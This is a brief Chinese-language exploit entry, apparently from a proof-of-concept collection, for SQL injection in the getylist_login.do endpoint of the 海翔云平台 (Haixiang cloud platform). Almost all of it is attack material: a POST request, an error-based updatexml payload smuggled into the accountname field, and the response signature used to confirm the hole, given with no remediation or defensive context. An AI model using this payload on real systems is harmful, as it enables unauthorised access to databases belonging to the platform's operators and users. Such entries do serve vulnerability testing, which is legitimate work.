# 海翔云平台getylist_login.doSQL注入漏洞

海翔云平台getylist_login.do ｜ SQL注入 ｜ —
- **请求**：`POST /getylist_login.do HTTP/1.1`

**Payload**
```
accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
```
- **响应特征**：500 e10adc3949ba59abbe56e057f20f883